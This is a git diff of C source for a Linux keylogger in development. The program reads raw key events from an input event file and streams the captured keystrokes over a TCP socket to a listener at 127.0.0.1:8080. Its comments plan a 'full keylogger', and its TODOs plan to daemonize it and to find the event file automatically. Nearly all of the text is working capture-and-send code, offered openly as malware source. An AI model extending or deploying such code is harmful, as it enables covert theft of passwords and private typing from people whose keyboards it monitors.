@@ -16,6 +16,10 @@ must flush stream to avoid buffering, use fflush()
 
 (TCP)
 
+TODO add dynamic event file detection
+
+TODO daemonize
+
 */
 
 #include <stdio.h>
@@ -23,6 +27,8 @@ must flush stream to avoid buffering, use fflush()
 #include <unistd.h>
 #include <linux/input.h>
 #include <strings.h>
+
+#include <signal.h>
 
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -32,10 +38,13 @@ must flush stream to avoid buffering, use fflush()
 #define IP "127.0.0.1"
 #define PORT 8080
 
+#define BUFFER_SIZE 32
+
 int tcp_connect(int *socket_fd);
 void print(int fd, int socket_fd);
 
 int main(int argc, char *argv[]) {
+
     if (argc != 2) {
         fprintf(stderr, "Eventfile argument required\n");
         return 1;
@@ -56,6 +65,7 @@ int main(int argc, char *argv[]) {
     }
 
     // print
+    signal(SIGPIPE, SIG_IGN);
     print(fd, socket_fd);
 
     close(socket_fd);
@@ -70,16 +80,16 @@ int tcp_connect(int *socket_fd) {
         fprintf(stderr, "Error creating socket\n");
         return 1;
     }
-    // fill struct
+    // fill sockaddr_in struct, later will cast as sockaddr
     struct sockaddr_in server;
     bzero(&server, sizeof(server));
 
     server.sin_family = AF_INET;
     server.sin_port = htons(PORT);
     server.sin_addr.s_addr = inet_addr(IP);
-    // connect socket fd to address described in sockaddr_in struct
+    // connect socket fd to address described in sockaddr struct
     if (connect(*socket_fd, (struct sockaddr *)&server, sizeof(server)) != 0) {
-        perror("Could not connect\n");
+        fprintf(stderr, "Connection refused\n");
         close(*socket_fd);
         return 1;
     }
@@ -90,6 +100,9 @@ int tcp_connect(int *socket_fd) {
 void print(int fd, int socket_fd) {
 
     struct input_event ie;
+    char buffer[BUFFER_SIZE];
+    ssize_t n;
+    int len;
 
     for (;;) {
         read(fd, &ie, sizeof(ie));
@@ -100,25 +113,47 @@ void print(int fd, int socket_fd) {
             continue;
 
         if (ie.code >= 2 && ie.code <= 10) {
-            printf("%d", ie.code - 1);
+            len = snprintf(buffer, sizeof(buffer), "%d", ie.code -1);
+            n = send(socket_fd, buffer, len, 0);
         } else if (ie.code == 11) {
-            printf("0");
+            n = send(socket_fd, "0", 1, 0);
         } else {
             switch (ie.code) {
                 case KEY_Q:
-                    send(socket_fd, "q", 1, 0);
+                    n = send(socket_fd, "q", 1, 0);
+                    break;
+                case KEY_W:
+                    n = send(socket_fd, "w", 1, 0);
+                    break;
+                case KEY_E:
+                    n = send(socket_fd, "e", 1, 0);
+                    break;
+                case KEY_R:
+                    n = send(socket_fd, "r", 1, 0);
+                    break;
+                case KEY_T:
+                    n = send(socket_fd, "t", 1, 0);
+                    break;
+                case KEY_Y:
+                    n = send(socket_fd, "y", 1, 0);
                     break;
                 case KEY_SPACE:
-                    send(socket_fd, " ", 1, 0);
+                    n = send(socket_fd, " ", 1, 0);
                     break;
                 case KEY_BACKSPACE:
-                    send(socket_fd, "(backspace)", 11, 0);
+                    n = send(socket_fd, "(backspace)", 11, 0);
                     break;
                 // add more case statements for full keylogger
+                // map keys and use indexing for better design
                 default:
-                    printf("Unknown key: %d\n", ie.code);
+                    len = snprintf(buffer, sizeof(buffer), "code:%d", ie.code);
+                    n = send(socket_fd, buffer, len, 0);
+                    break;
             }
         }
-        // fflush(stdout); not necessary for send()
+        if (n == -1) {
+            fprintf(stderr, "Peer disconnected");
+            return;
+        }
     }
 }
